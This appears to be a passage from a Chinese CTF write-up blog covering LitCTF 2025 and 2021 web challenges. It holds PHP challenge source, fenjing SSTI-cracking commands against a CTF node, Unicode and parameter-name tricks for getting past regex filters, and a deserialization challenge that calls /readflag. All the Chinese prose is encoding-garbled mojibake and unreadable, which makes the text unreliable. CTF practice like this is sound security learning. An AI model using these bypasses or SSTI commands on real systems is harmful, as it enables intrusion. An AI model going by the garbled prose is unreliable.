class="hljs-keyword">foreach</span> (<span class="hljs-variable">$forbidden_protocols</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$proto</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-variable">$proto</span>) === <span class="hljs-number">0</span>) &#123;  <br>            <span class="hljs-variable">$protocol_block</span> = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$log_block</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-string">&#x27;.log&#x27;</span>) !== <span class="hljs-literal">false</span>;  <br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$protocol_block</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç¦æ­¢è®¿é—®ï¼šä¸å…è®¸ä½¿ç”¨ <span class="hljs-subst">&#123;$proto&#125;</span> åè®®&quot;</span>;<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$log_block</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç¦æ­¢è®¿é—®ï¼šURL åŒ…å« .log&quot;</span>;<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-string">&#x27;login.php&#x27;</span>) !== <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-string">&#x27;dashboard.php&#x27;</span>) !== <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-string">&#x27;327a6c4304ad5938eaf0efb6cc3e53dc.php&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;çœ‹ä¸è§å“¦&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;b--&gt;</span><br></code></pre></td></tr></table></figure>
<p>ç„¶åçœ‹åˆ°é‡Œé¢æœ‰ä¸ª327a6c4304ad5938eaf0efb6cc3e53dc.php<br>åœ¨ä¸»è§£æè®¿é—®ç›´æ¥å¾—åˆ°flag  </p>
<p>çœ‹åˆ°æœ‰å¤§ä½¬å†™é©¬çš„wp<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/TouHp/p/18895822">https://www.cnblogs.com/TouHp/p/18895822</a><br>çœ‹ä¸æ‡‚ï¼Œå…ˆä¾›ç€  </p>
<h1 id="LitCTF-2025-æ˜Ÿæ„¿ä¿¡ç®±"><a href="#LitCTF-2025-æ˜Ÿæ„¿ä¿¡ç®±" class="headerlink" title="[LitCTF 2025]æ˜Ÿæ„¿ä¿¡ç®±"></a>[LitCTF 2025]æ˜Ÿæ„¿ä¿¡ç®±</h1><p>åŸæ¥è¿™é¢˜ç›´æ¥ç”¨fenjingå°±èƒ½æ¢­å‡ºæ¥çš„ï¼Œè¿™å€’æ˜¯å‘ç°äº†æˆ‘ç¯å¢ƒçš„é—®é¢˜<br>ä»¥å‰æ˜¯ç›´æ¥åœ¨powershell è·‘fenjing web ui ç‰ˆï¼Œ<br>ä¸€ç›´è·‘ä¸å‡ºæ¥<br>å»å¼äº†åˆ«äººwpçš„fenjingæŒ‡ä»¤ä¹Ÿä¸è¡Œï¼Œ<br>ç»™då¯¼çœ‹äº†ï¼ŒåŸæ¥æ˜¯powershellçš„å­—ç¬¦éœ€è¦è½¬è¯‘  </p>
<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig">åŸæŒ‡ä»¤ï¼š  <br><span class="hljs-string">fenjing</span> <span class="hljs-string">crack-json</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&#x27;http://node6.anna.nssctf.cn:28919/&#x27;</span> <span class="hljs-built_in">--json-data</span> <span class="hljs-string">&#x27;&#123;&quot;cmd&quot;: &quot;a&quot;&#125;&#x27;</span> <span class="hljs-built_in">--key</span> <span class="hljs-string">cmd</span> <span class="hljs-built_in">--replaced-keyword-strategy</span> <span class="hljs-string">ignore</span>  <br>ç”¨ä¸å‡ºæ¥ï¼Œä¸€ç›´æç¤ºæŠ¥é”™  <br><br><span class="hljs-string">d</span>å¯¼ç»™çš„å‘½ä»¤:  <br><span class="hljs-string">fenjing</span> <span class="hljs-string">crack-json</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&#x27;http://node6.anna.nssctf.cn:28919/&#x27;</span> <span class="hljs-built_in">--json-data</span> <span class="hljs-string">&#x27;&#123;\&quot;cmd\&quot;: \&quot;a\&quot;&#125;&#x27;</span> <span class="hljs-built_in">--key</span> <span class="hljs-string">cmd</span> <span class="hljs-built_in">--replaced-keyword-strategy</span> <span class="hljs-string">ignore</span>    <br><br></code></pre></td></tr></table></figure>
<p>è¦ä¸è¯´ä»¥åfenjingåœ¨linuxé‡Œè·‘ï¼Ÿ<br>æ²¡ç”¨ï¼Œåœ¨Linuxä¸‹è·‘çš„fenjing webui è¿˜æ˜¯æ— æ³•æˆåŠŸ<br>çœ‹æ¥åªèƒ½ç”¨å‘½ä»¤è·‘äº†</p>
<h1 id="é¹¤åŸæ¯-2021-EasyP"><a href="#é¹¤åŸæ¯-2021-EasyP" class="headerlink" title="[é¹¤åŸæ¯ 2021]EasyP"></a>[é¹¤åŸæ¯ 2021]EasyP</h1><p>å¼€é¢˜å…ˆè§æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;utils.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$guess</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$guess</span> === <span class="hljs-variable">$secret</span>) &#123;<br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="hljs-variable">$flag</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong. Try Again&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show_source&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
<p>åªçœ‹ä¸€çœ¼ï¼Œçœ‹ä¸Šå»åƒæ˜¯çŒœè°œæ¸¸æˆï¼Œè¿‡æ»¤äº†ï¼š<br>â€˜&#x2F;utils.php/*$&#x2F;iâ€™<br>â€˜&#x2F;show_source&#x2F;â€˜   </p>
<p>ä½†æ˜¯åˆè®¾ç½®åˆâ€™&#x2F;show_source&#x2F;â€˜æˆåŠŸä¼ å…¥åçš„ç»“æœï¼Œæ‰€ä»¥åº”è¯¥æ˜¯èƒ½ç»•è¿‡æ­£åˆ™è¿‡æ»¤çš„<br>ä¸ç®¡äº†ï¼Œé—®ai  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// å¼•å…¥åä¸º utils.php çš„æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å¯èƒ½åŒ…å«ä¸€äº›è¾…åŠ©åŠŸèƒ½æˆ–å˜é‡å®šä¹‰ã€‚</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;utils.php&#x27;</span>;<br><br><span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦å­˜åœ¨åä¸º &#x27;guess&#x27; çš„ POST è¯·æ±‚å‚æ•°ã€‚</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// å°† POST è¯·æ±‚ä¸­çš„ &#x27;guess&#x27; å‚æ•°å€¼å¼ºåˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œå¹¶èµ‹å€¼ç»™å˜é‡ $guessã€‚</span><br>    <span class="hljs-variable">$guess</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>    <span class="hljs-comment">// åˆ¤æ–­ç”¨æˆ·æäº¤çš„çŒœæµ‹å€¼ $guess æ˜¯å¦ä¸å˜é‡ $secret ç›¸ç­‰ã€‚</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$guess</span> === <span class="hljs-variable">$secret</span>) &#123;<br>        <span class="hljs-comment">// å¦‚æœçŒœæµ‹æ­£ç¡®ï¼Œå°†æç¤ºä¿¡æ¯å’Œ $flag å˜é‡çš„å€¼æ‹¼æ¥åèµ‹å€¼ç»™ $messageã€‚</span><br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="hljs-variable">$flag</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// å¦‚æœçŒœæµ‹é”™è¯¯ï¼Œæç¤ºç”¨æˆ·é‡æ–°å°è¯•ã€‚</span><br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong. Try Again&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// æ£€æŸ¥å½“å‰è„šæœ¬çš„è·¯å¾„æ˜¯å¦ä»¥ &quot;utils.php&quot; ç»“å°¾ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™ç»ˆæ­¢è„šæœ¬è¿è¡Œï¼Œé˜²æ­¢ç›´æ¥è®¿é—® utils.php æ–‡ä»¶ã€‚</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// æ£€æŸ¥è¯·æ±‚çš„ URI æ˜¯å¦åŒ…å« &quot;show_source&quot; å­—ç¬¦ä¸²ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™ç»ˆæ­¢è„šæœ¬è¿è¡Œï¼Œé˜²æ­¢æ˜¾ç¤ºæºä»£ç ã€‚</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦å­˜åœ¨åä¸º &#x27;show_source&#x27; çš„ GET è¯·æ±‚å‚æ•°ã€‚</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show_source&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// å¦‚æœå­˜åœ¨ï¼Œåˆ™ä½¿ç”¨ highlight_file å‡½æ•°é«˜äº®æ˜¾ç¤ºå½“å‰è„šæœ¬æ–‡ä»¶çš„ä»£ç ï¼Œå¹¶ç»ˆæ­¢è„šæœ¬è¿è¡Œã€‚</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// å¦‚æœä¸å­˜åœ¨ &#x27;show_source&#x27; GET å‚æ•°ï¼Œåˆ™è°ƒç”¨ show_source å‡½æ•°ï¼ˆå¯èƒ½åœ¨ utils.php ä¸­å®šä¹‰ï¼‰æ˜¾ç¤ºå½“å‰è„šæœ¬çš„æºä»£ç ã€‚</span><br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p><strong>basename($_SERVER[â€˜PHP_SELFâ€™]) æ˜¯ä»€ä¹ˆæ„æ€</strong><br>é—®äº†aiå<br>é‚£æˆ‘å¤§æ¦‚ç†è§£æ˜¯è¿”å›å½“å‰å®¢æˆ·è¯·æ±‚çš„urlçš„æœ€åçš„æ–‡ä»¶åå­—ï¼Œç„¶åé…åˆhighlight_fileæ˜¾ç¤ºæºç   </p>
<p>æ‰€ä»¥æ˜¯<br>å…ˆç»•è¿‡  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// æ£€æŸ¥å½“å‰è„šæœ¬çš„è·¯å¾„æ˜¯å¦ä»¥ &quot;utils.php&quot; ç»“å°¾ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™ç»ˆæ­¢è„šæœ¬è¿è¡Œï¼Œé˜²æ­¢ç›´æ¥è®¿é—® utils.php æ–‡ä»¶ã€‚</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>çœ‹ç½‘ä¸Šwpçš„åŠæ³•æ˜¯åœ¨urlçš„å®é™…è·¯å¾„ä¸Šæ·»åŠ ä¸å½±å“è·¯å¾„è§£æçš„å­—ç¬¦  </p>
<p>é—®aiæ‰¾å‡ºèƒ½ç”¨çš„ï¼š  </p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm">é›¶å®½åº¦ç©ºæ ¼ï¼ˆZero-Width Spaceï¼‰<br>ç¼–ç ï¼š<span class="hljs-variable">%E2</span><span class="hljs-variable">%80</span><span class="hljs-variable">%8</span>B<br>æè¿°ï¼šè¡¨ç¤ºé›¶å®½åº¦ç©ºæ ¼ã€‚<br>æ½œåœ¨å½±å“ï¼šå¯èƒ½å¯¼è‡´è·¯å¾„è§£æé”™è¯¯æˆ–ç»•è¿‡æŸäº›åŸºäºå­—ç¬¦ä¸²åŒ¹é…çš„å®‰å…¨æ£€æŸ¥ã€‚<br><br>å…¶ä»– Unicode ç©ºç™½å­—ç¬¦<br>å…¨è§’ç©ºæ ¼ï¼š<span class="hljs-variable">%EF</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%A0</span>ï¼ˆå…¨è§’ç©ºæ ¼ï¼‰<br>åŠè§’ç©ºæ ¼ï¼š<span class="hljs-variable">%20</span>ï¼ˆæ™®é€šç©ºæ ¼ï¼‰<br>ä¸­æ–‡æ ‡ç‚¹ç¬¦å·ï¼šå¦‚ <span class="hljs-variable">%E3</span><span class="hljs-variable">%80</span><span class="hljs-variable">%81</span>ï¼ˆä¸­æ–‡é€—å·ï¼‰ã€<span class="hljs-variable">%E3</span><span class="hljs-variable">%80</span><span class="hljs-variable">%82</span>ï¼ˆä¸­æ–‡å¥å·ï¼‰ç­‰<br>æ½œåœ¨å½±å“ï¼šè¿™äº›å­—ç¬¦å¯èƒ½ä¼šè¢«è¯¯è®¤ä¸ºæ™®é€šç©ºæ ¼æˆ–è·¯å¾„åˆ†éš”ç¬¦ï¼Œä»è€Œç»•è¿‡æŸäº›åŸºäºå­—ç¬¦ä¸²åŒ¹é…çš„å®‰å…¨æ£€æŸ¥ã€‚<br></code></pre></td></tr></table></figure>

<p>ç„¶åæ˜¯</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// æ£€æŸ¥è¯·æ±‚çš„ URI æ˜¯å¦åŒ…å« &quot;show_source&quot; å­—ç¬¦ä¸²ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™ç»ˆæ­¢è„šæœ¬è¿è¡Œï¼Œé˜²æ­¢æ˜¾ç¤ºæºä»£ç ã€‚</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>çš„ç»•è¿‡<br>æˆ‘çœ‹æœ‰wpæ˜¯ç›´æ¥ç”¨<br>show+sourceç›´æ¥ç»•è¿‡<br>é—®dpè¯´ä¸åº”è¯¥ï¼Œæ­£å¸¸æ˜¯urlç¼–ç ä¸‹æ»‘çº¿æ¥åŒ¹é…æ˜¾ç¤ºæºç çš„æ¡ä»¶    </p>
<p><strong>ç»§ç»­è¿½é—®:</strong><br>ä¸ºä»€ä¹ˆè¿™ä¸ªè½¬æ¢ä¼šå‘ç”Ÿï¼Ÿ<br>è¿™æ˜¯ PHP çš„å†å²é—ç•™è¡Œä¸ºï¼ˆä¸ºäº†å…¼å®¹ register_globals æ—¶ä»£ï¼‰ï¼ŒPHP ä¼šè‡ªåŠ¨è½¬æ¢å‚æ•°åä¸­çš„ç‰¹å®šå­—ç¬¦ï¼š</p>
<p>ç©ºæ ¼ â†’ ä¸‹åˆ’çº¿ _</p>
<p>ç‚¹å· . â†’ ä¸‹åˆ’çº¿ _</p>
<p>å…¶ä»–ç‰¹æ®Šå­—ç¬¦ä¹Ÿä¼šè¢«è½¬æ¢</p>
<p>è¿™æ˜¯ PHP çš„é»˜è®¤è¡Œä¸ºï¼Œå¯ä»¥åœ¨ php.ini ä¸­é€šè¿‡ request_parameter_handling é…ç½®ï¼Œä½†é»˜è®¤æ˜¯å¯ç”¨çš„ã€‚</p>
<hr>
<h2 id="title-note-38date-2025-06-21-23-33-35tags"><a href="#title-note-38date-2025-06-21-23-33-35tags" class="headerlink" title="title: note-38date: 2025-06-21 23:33:35tags:"></a>title: note-38<br>date: 2025-06-21 23:33:35<br>tags:</h2><h1 id="LitCTF-2025-å›ã®åã¯"><a href="#LitCTF-2025-å›ã®åã¯" class="headerlink" title="[LitCTF 2025]å›ã®åã¯"></a>[LitCTF 2025]å›ã®åã¯</h1><p>å¼€é¢˜å…ˆç»™æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// æ˜¾ç¤ºå½“å‰æ–‡ä»¶çš„æºä»£ç </span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// å…³é—­æ‰€æœ‰é”™è¯¯æŠ¥å‘Š</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œå½“è°ƒç”¨æ—¶ä¼šæ‰§è¡Œ`/readflag`å‘½ä»¤</span><br><span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&#x27;die(`/readflag`);&#x27;</span>);<br><br><span class="hljs-comment">// å®šä¹‰Takiç±»</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Taki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$musubi</span>; <span class="hljs-comment">// ç§æœ‰å±æ€§</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$magic</span>;  <span class="hljs-comment">// ç§æœ‰å±æ€§</span><br>    <br>    <span class="hljs-comment">// __unserializeé­”æœ¯æ–¹æ³•ï¼Œåœ¨ååºåˆ—åŒ–æ—¶è°ƒç”¨</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;musubi = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;musubi&#x27;</span>]; <span class="hljs-comment">// ä»æ•°ç»„ä¸­è®¾ç½®musubiå±æ€§</span><br>        <span class="hljs-variable language_">$this</span>-&gt;magic = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;magic&#x27;</span>];   <span class="hljs-comment">// ä»æ•°ç»„ä¸­è®¾ç½®magicå±æ€§</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;musubi)();       <span class="hljs-comment">// è°ƒç”¨musubiå±æ€§ï¼ˆå‡è®¾å®ƒæ˜¯å¯è°ƒç”¨çš„ï¼‰</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// __callé­”æœ¯æ–¹æ³•ï¼Œå½“è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è§¦å‘</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-comment">// åŠ¨æ€åˆ›å»ºå¯¹è±¡å¹¶è°ƒç”¨æ–¹æ³•</span><br>        (<span class="hljs-keyword">new</span> <span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$args</span>[<span class="hljs-number">1</span>]))-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;magic&#125;();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// å®šä¹‰Mitsuhaç±»</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mitsuha</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$memory</span>;  <span class="hljs-comment">// ç§æœ‰å±æ€§</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$thread</span>;  <span class="hljs-comment">// ç§æœ‰å±æ€§</span><br>    <br>    <span class="hljs-comment">// __invokeé­”æœ¯æ–¹æ³•ï¼Œå½“å¯¹è±¡è¢«å½“ä½œå‡½æ•°è°ƒç”¨æ—¶è§¦å‘</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// è¿”å›ä¸¤ä¸ªå±æ€§çš„è¿æ¥</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;memory.<span class="hljs-variable language_">$this</span>-&gt;thread;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// å®šä¹‰KatawareDokiç±»</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KatawareDoki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$soul</span>;           <span class="hljs-comment">// ç§æœ‰å±æ€§</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$kuchikamizake</span>;  <span class="hljs-comment">// ç§æœ‰å±æ€§</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;          <span class="hljs-comment">// ç§æœ‰å±æ€§</span><br>    <br>    <span class="hljs-comment">// __toStringé­”æœ¯æ–¹æ³•ï¼Œå½“å¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span 